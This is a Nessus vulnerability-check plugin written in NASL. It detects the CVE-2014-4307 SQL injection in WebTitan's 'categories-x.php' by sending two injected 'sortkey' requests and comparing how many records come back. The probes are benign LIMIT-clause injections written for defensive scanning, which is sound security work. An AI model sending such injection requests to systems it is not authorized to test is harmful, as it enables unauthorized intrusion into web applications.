#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(76598);
  script_version("$Revision: 1.2 $");
  script_cvs_date("$Date: 2015/09/24 23:21:22 $");

  script_cve_id("CVE-2014-4307");
  script_bugtraq_id(67921);
  script_osvdb_id(107766);

  script_name(english:"WebTitan 'categories-x.php' 'sortkey' Parameter SQL Injection");
  script_summary(english:"Tries to manipulate a SQL query.");

  script_set_attribute(attribute:"synopsis", value:
"The remote host has a web application installed that is affected by a
SQL injection vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of WebTitan installed on the remote host is affected by a
SQL injection vulnerability in the 'sortkey' parameter of the
'categories-x.php' script. By sending a specially crafted request, a
remote unauthenticated attacker could execute arbitrary SQL queries.");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2014/Jun/35");
  script_set_attribute(attribute:"solution", value:"Upgrade to WebTitan 4.04 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2014/06/06");
  script_set_attribute(attribute:"patch_publication_date", value:"2014/06/03");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/07/18");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:webtitan:webtitan");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2014-2015 Tenable Network Security, Inc.");

  script_dependencies("webtitan_detect.nbin");
  script_require_keys("www/webtitan");
  script_require_ports("Services/www", 80, 443);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("webapp_func.inc");
include("http.inc");
include("url_func.inc");

port = get_http_port(default:80, php:TRUE);

install = get_install_from_kb(
  appname:"webtitan",
  port:port,
  exit_on_fail:TRUE
);

dir = install['dir'];
loc = build_url(port:port, qs:dir);

payload1 = "getcategories&sortkey=name)%20limit%201;--";
payload2 = "getcategories&sortkey=name)%20limit%203;--";
url = dir + "/categories-x.php?";

res1 = http_send_recv3(method:"GET", item:url + payload1, port:port, exit_on_fail:TRUE);

vuln = FALSE;
pattern = '"categoryid":[0-9]+,"name":';
# Check the first result to make sure there is only 1 record returned
items = split(res1[2], sep:'},', keep:FALSE);
if (items && max_index(items) == 1)
{
  # Check the second result to make sure there are only 3 records returned
  res2 = http_send_recv3(method:"GET", item:url + payload2, port:port, exit_on_fail:TRUE);
  items = split(res2[2], sep:'},', keep:FALSE);
  if (items && max_index(items) == 3)
    vuln = TRUE;
}

if (!vuln) audit(AUDIT_WEB_APP_NOT_AFFECTED, 'WebTitan', loc);

set_kb_item(name:'www/'+port+'/SQLInjection', value:TRUE);
if (report_verbosity > 0)
{
  report =
    '\n' + 'Nessus was able to verify the issue exists using the following requests :' +
    '\n' +
    '\n' + loc + "/categories-x.php?" + payload1 +
    '\n' + loc + "/categories-x.php?" + payload2 +
    '\n';
  security_hole(port:port, extra:report);
  exit(0);
}
else security_hole(port);
